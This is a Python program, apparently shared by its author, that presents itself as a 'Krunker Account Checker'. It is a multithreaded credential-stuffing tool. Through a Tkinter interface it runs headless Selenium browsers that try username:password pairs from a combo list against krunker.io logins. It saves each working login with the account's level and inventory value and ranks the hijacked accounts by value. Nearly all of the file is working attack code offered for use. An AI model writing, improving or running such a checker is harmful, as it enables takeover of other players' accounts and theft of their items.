import tkinter as tk
from tkinter import ttk
from tkinter import scrolledtext
from tkinter import messagebox
import threading
import time
import re
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import queue

# Global variables for GUI elements and threading
root = tk.Tk()
status_label = None
start_button = None
stop_button = None
is_running = False
threads = []
processed_lines = 0
counter_label = None
num_threads_entry = None
tab_views = []
update_queue = queue.Queue()

# Track processed usernames across all threads
processed_usernames = set()

# Define a lock for thread safety
lock = threading.Lock()

# Define the log function
def log(message, tab_index=None):
    update_queue.put((message, tab_index))

# Function to extract info from profile
def extract_info(driver):
    try:
        level_element = WebDriverWait(driver, 5).until(
            EC.visibility_of_element_located((By.XPATH, "//div[@class='pSt' and contains(text(), 'LVL')]"))
        )
        level_text = level_element.text.replace("LVL", "").strip()
        level = int(re.sub(r'[^\d]', '', level_text))

        inventory_element = WebDriverWait(driver, 5).until(
            EC.visibility_of_element_located((By.XPATH, "//div[@class='pSt' and contains(text(), 'Inventory')]"))
        )
        inventory_value_text = inventory_element.find_element(By.XPATH, "./strong").text.strip().replace(",", "").replace("~", "")
        inventory_value = int(re.sub(r'[^\d]', '', inventory_value_text))

        return level, inventory_value
    except Exception as e:
        log(f"Error extracting info: {str(e)}", None)
        return None, None

# Function to handle login and data extraction
def login_and_extract(username, password):
    global processed_lines
    try:
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        
        driver = webdriver.Chrome(options=chrome_options)
        
        url = f'https://krunker.io/social.html?p=profile&q={username}'
        driver.get(url)
        
        try:
            accept_button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.ID, "onetrust-accept-btn-handler"))
            )
            accept_button.click()
        except TimeoutException:
            log(f"Timeout: OneTrust accept button not found for {username}, moving to next.", None)
            driver.quit()
            return
        
        try:
            login_button = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.ID, "profileLogin"))
            )
            login_button.click()
            
            acc_name_input = WebDriverWait(driver, 5).until(
                EC.visibility_of_element_located((By.ID, "accName"))
            )
            acc_name_input.send_keys(username)
            
            acc_pass_input = WebDriverWait(driver, 5).until(
                EC.visibility_of_element_located((By.ID, "accPass"))
            )
            acc_pass_input.send_keys(password)
            
            login_acc_button = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.CLASS_NAME, "accBtn"))
            )
            login_acc_button.click()
            
            try:
                WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.XPATH, "//i[@class='material-icons' and contains(@style, 'color:#3be354')]"))
                )
                level, inventory = extract_info(driver)
                if level is not None and inventory is not None:
                    log(f"Username: {username}, Level: {level}, Inventory Value: {inventory}", None)
                    
                    with lock:
                        with open("success.txt", "a") as success_file:
                            success_file.write(f"Username: {username}, Level: {level}, Inventory Value: {inventory}\n")
                    
                    update_success_tab()  # Refresh success tab with new data
                    
                    export_sorted_data("inventory.txt", "Inventory Value", 2)
                    export_sorted_data("level.txt", "Level", 1)
                
            except TimeoutException:
                log(f"Failed login for {username}, moving to next.", None)
            
        except TimeoutException:
            log(f"Timeout: Login elements not found for {username}, moving to next.", None)
            
    except WebDriverException as e:
        log(f"WebDriver exception for {username}: {str(e)}", None)
    except Exception as e:
        log(f"Error processing username: {username}", None)
        log(f"Error: {str(e)}", None)
    finally:
        driver.quit()

# Function to export sorted data
def export_sorted_data(filename, sort_key, value_index):
    with lock:
        with open("success.txt", "r", errors='ignore') as file:
            lines = file.readlines()
        
        lines.sort(key=lambda line: int(line.split(", ")[value_index].split(": ")[1].replace(",", "").replace("~", "")), reverse=True)

        with open(filename, "w", errors='ignore') as outfile:
            for line in lines:
                outfile.write(line)

# Function to update success tab
def update_success_tab():
    with lock:
        tab_views[1].delete(1.0, tk.END)  # Clear the current content of the success tab
        
        # Read and sort the success file based on Inventory Value
        try:
            with open("success.txt", "r", errors='ignore') as success_file:
                lines = success_file.readlines()
                # Sort lines based on the Inventory Value
                lines.sort(key=lambda line: int(line.split(", ")[2].split(": ")[1].replace(",", "").replace("~", "")), reverse=True)
                
                for line in lines:
                    tab_views[1].insert(tk.END, line)
        except FileNotFoundError:
            tab_views[1].insert(tk.END, "No successful accounts found.\n")
        
        tab_views[1].yview(tk.END)

# Function to run thread for processing combos
def run_thread(combos):
    global processed_lines
    while combos:
        with lock:
            if not is_running:
                return
        
        combo = combos.pop(0).strip()
        if ':' in combo:
            username, password = combo.split(':', 1)
            username = username.split()[0]
            
            if username in processed_usernames:
                continue
            
            log(f"Trying username: {username}", None)
            login_and_extract(username, password)
            
            with lock:
                with open("used.txt", "a", errors='ignore') as used_file:
                    used_file.write(f"{combo}\n")
                
                with open("combo.txt", "r", errors='ignore') as combo_file:
                    lines = combo_file.readlines()
                
                with open("combo.txt", "w", errors='ignore') as combo_file:
                    for line in lines:
                        if line.strip() != combo:
                            combo_file.write(line)
            
            processed_usernames.add(username)
        processed_lines += 1
        update_counter_label()

# Function to start the script
def start_script():
    global is_running, threads, processed_lines, num_threads
    if is_running:
        messagebox.showinfo("Info", "Script is already running.")
        return
    
    is_running = True
    threads = []
    processed_lines = 0
    update_counter_label()

    try:
        num_threads = int(num_threads_entry.get())
    except ValueError:
        num_threads = 1
        messagebox.showerror("Error", "Invalid number of threads. Using default value of 1.")
    
    all_combos = []
    with open("combo.txt", "r", errors='ignore') as file:
        for line in file:
            try:
                all_combos.append(line)
            except UnicodeDecodeError:
                log(f"Skipping line due to UnicodeDecodeError: {line}")
    
    split_combos = [all_combos[i::num_threads] for i in range(num_threads)]
    
    for i in range(num_threads):
        thread = threading.Thread(target=run_thread, args=(split_combos[i],))
        thread.start()
        threads.append(thread)
    
    start_button.config(state=tk.DISABLED)
    stop_button.config(state=tk.NORMAL)

# Function to stop the script
def stop_script():
    global is_running
    is_running = False
    start_button.config(state=tk.NORMAL)
    stop_button.config(state=tk.DISABLED)

# Function to update the counter label
def update_counter_label():
    global processed_lines
    if counter_label:
        counter_label.config(text=f"Processed Lines: {processed_lines}")

# Function to update GUI from the queue
def update_gui_from_queue():
    while not update_queue.empty():
        message, tab_index = update_queue.get()
        if tab_index is not None:
            tab_views[tab_index].insert(tk.END, message + "\n")
            tab_views[tab_index].yview(tk.END)
        else:
            tab_views[0].insert(tk.END, message + "\n")
            tab_views[0].yview(tk.END)
    root.after(100, update_gui_from_queue)

# GUI setup
def setup_gui():
    global status_label, start_button, stop_button, num_threads_entry, counter_label, tab_views

    root.title("Krunker Account Checker - Made by @cleanest")
    root.geometry("800x600")
    root.configure(bg='#1e1e1e')

    style = ttk.Style()
    style.configure('TButton', background='#1e1e1e', foreground='black', padding=[10, 5])
    style.configure('TLabel', background='#1e1e1e', foreground='white', font=('Helvetica', 11))
    style.configure('TEntry', padding=[10, 5])
    style.configure('TNotebook', background='#1e1e1e', borderwidth=0)
    style.configure('TNotebook.Tab', background='#333333', foreground='black', padding=[10, 5])
    style.map('TNotebook.Tab', background=[('selected', '#007acc')], foreground=[('selected', 'black')])

    # Frame for controls
    control_frame = ttk.Frame(root)
    control_frame.grid(row=0, column=0, padx=10, pady=10, sticky='ns')
    
    start_button = ttk.Button(control_frame, text="Start checker", command=start_script)
    start_button.grid(row=0, column=0, pady=5)

    stop_button = ttk.Button(control_frame, text="Stop checker", command=stop_script, state=tk.DISABLED)
    stop_button.grid(row=1, column=0, pady=5)

    status_label = ttk.Label(control_frame, text="Status: Checking")
    status_label.grid(row=2, column=0, pady=5)

    counter_label = ttk.Label(control_frame, text="Checked Lines: 0")
    counter_label.grid(row=3, column=0, pady=5)

    num_threads_label = ttk.Label(control_frame, text="Number of Threads:")
    num_threads_label.grid(row=4, column=0, pady=5)

    num_threads_entry = ttk.Entry(control_frame)
    num_threads_entry.grid(row=5, column=0, pady=5)
    num_threads_entry.insert(0, "1")

    # Notebook for tabs
    tab_control = ttk.Notebook(root)
    tab_control.grid(row=0, column=1, sticky='nsew', padx=10, pady=10)

    tab_control.configure(style='TNotebook')
    tab_views = [scrolledtext.ScrolledText(tab_control, wrap=tk.WORD, bg='#2a2a2a', fg='white', font=('Courier New', 10)) for _ in range(2)]

    tab_control.add(tab_views[0], text='Log')
    tab_control.add(tab_views[1], text='Success')

    root.grid_rowconfigure(0, weight=1)
    root.grid_columnconfigure(1, weight=1)

    root.after(100, update_gui_from_queue)
    root.mainloop()

setup_gui()
